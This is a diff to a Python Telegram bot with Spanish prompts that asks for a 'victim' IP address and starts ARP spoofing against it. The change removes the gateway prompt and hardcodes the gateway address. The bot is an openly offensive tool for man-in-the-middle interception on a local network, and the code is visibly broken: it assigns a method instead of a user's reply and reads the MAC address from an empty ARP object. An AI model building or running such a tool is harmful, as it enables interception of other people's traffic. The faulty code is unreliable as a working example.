@@ -31,26 +31,22 @@ def help(update, context):
 def attack(update, context):
 
     reply_keyboard = [['/cancel']]
+    
     ip = update.message.reply_text(
         '¿Cuál es la dirección IP de su víctima? (Escriba "/cancel" para cancelar la petición)',
         reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
     )
 
     return IP
-  
-    gateway = update.message.reply_text(
-        '¿Cuál es la Gateway de su víctima? (Escriba "/cancel" para cancelar la petición)',
-        reply_markup2=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
-    )
-  
-    return GATEWAY
 
 def set_ip(update, context):
+  
+    ip = update.message.reply_text
 
     logger.info(f'ARP spoofing iniciado para {ip}')
 
     target_ip = ip
-    gateway_ip = gateway
+    gateway_ip = "192.168.75.1"
 
     try:
         target_mac = ARP().hwsrc
@@ -82,8 +78,7 @@ conv_handler = ConversationHandler(
   
     states={
       
-        IP: [MessageHandler(None, set_ip)],
-        GATEWAY: [MessageHandler(None, set_ip)]
+        IP: [MessageHandler(None, set_ip)]
     },
   
     fallbacks=[MessageHandler(None, cancel)]
